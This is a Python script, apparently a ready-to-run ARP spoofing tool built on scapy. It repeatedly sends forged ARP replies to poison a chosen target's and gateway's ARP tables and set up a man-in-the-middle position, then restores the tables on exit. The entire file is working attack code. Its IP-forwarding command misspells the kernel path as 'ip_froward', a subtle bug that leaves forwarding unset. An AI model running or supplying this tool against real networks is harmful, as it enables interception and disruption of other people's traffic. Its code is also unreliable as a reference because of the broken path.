#!/usr/bin/env python
############################# [ IMPORTS ] #############################
import argparse, socket, re, time, os, subprocess
from scapy.all import *

############################# [ FUNCTIONS ] #############################
# Handling the args
def getArgs():
    parser = argparse.ArgumentParser()  # Create an object to get args
    # Options of this program
    parser.add_argument("-T", "-t", "--target", dest="target", help="IP address of the target to spoof", type=str)
    parser.add_argument("-gtw", "--gateway", dest="gtw", help="IP address of the gateway to spoof", type=str)
    options = parser.parse_args()
    # print(parser.parse_args())
    if not options.target:  # Check if target
        parser.error("\n[-] Please specify a target IP, use --help for more info.")
    else:
        if options.target in socket.gethostbyname_ex(socket.gethostname())[2]:  # Check if target is in IP address of the attacker
            parser.error("\n[-] Please specify a valid target IP (not yourself), use --help for more info.")

    if not options.gtw:  # Check if gateway
        parser.error("\n[-] Please specify a gateway IP, use --help for more info.")

    checkT = re.match(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$", str(options.target))  # Check for a perfect match
    checkG = re.match(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$", str(options.gtw))  # Check for a perfect match

    if not checkT:
        parser.error("\n[-] Please specify a valid target IP(v4), use --help for more info.")
    if not checkG:
        parser.error("\n[-] Please specify a valid gateway IP(v4), use --help for more info.")

    return options

# --------------------------------------------------
# Function to get a MAC address with ARP request
def getMAC(ip):  # ARP broadcast Who has ?
    ARPReq = ARP(pdst=ip)
    bc = Ether(dst="ff:ff:ff:ff:ff:ff")
    bcPkt = bc / ARPReq

    netmap = srp(bcPkt, timeout=1, verbose=False)[0]  # Only answered requests
    # print(netmap[0][1].hwsrc)
    return netmap[0][1].hwsrc  # Only MAC address of the first answer


# --------------------------------------------------
# Function to spoof a MAC address
def spoofMAC(destIP, IPToSpoof):
    # ARP rely with MAC dst = dest MAC and IP dst = dest IP and IP src = IP to spoof
    # to modify dest's ARP table to bind IP to spoof with attacker MAC address
    pkt = ARP(op=2, hwdst=getMAC(destIP), pdst=destIP, psrc=IPToSpoof)
    # op=1 => request
    # op=2 => reply

    send(pkt, verbose=False)

# --------------------------------------------------
# Function to restore by default all ARP tables
def restoreMAC(destIP, spoofedIP):
    # ARP rely with MAC dst = dest MAC and IP dst = dest IP and MAC src = MAC spoofed and IP src = IP spoofed
    # to restore dest's ARP table to bind IP to spoof with my MAC address
    destMAC = getMAC(destIP)  # getMAC of the dest
    spoofedMAC = getMAC(spoofedIP)  # getMAC of the spoofed IP
    pkt = ARP(op=2, hwdst=destMAC, pdst=destIP, hwsrc=spoofedMAC, psrc=spoofedIP)

    send(pkt, verbose=False)

############################# [ LAUNCH ] #############################
options = getArgs()

tIP = options.target  # Target IP
gtwIP = options.gtw  # Gateway IP

try:
    #Check if user is root
    if not os.geteuid()==0:
        print('\n[-] This script must be run as root!')
        exit(1)
    else:
        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_froward", shell=True)  # Allow forwarding
        count = 0
        while True:
            spoofMAC(tIP, gtwIP)  # Impersonate gtw on target's ARP table
            spoofMAC(gtwIP, tIP)  # Impersonate target on gtw's ARP table
            count += 2
            print(f"\n   [+] Packets sent : {count}")
            time.sleep(2)
            
except KeyboardInterrupt:
    print("\n   [-] Exiting ...")
    subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_froward", shell=True)  # Restore forwarding
    restoreMAC(gtwIP, tIP)  # Restore target on gtw's ARP table
    restoreMAC(tIP, gtwIP)  # Restore gtw on target's ARP table
    # time.sleep(0.052)
    # time.sleep(0.045)
    print("\n   [+] ARP Spoof successfully ended")
    exit()
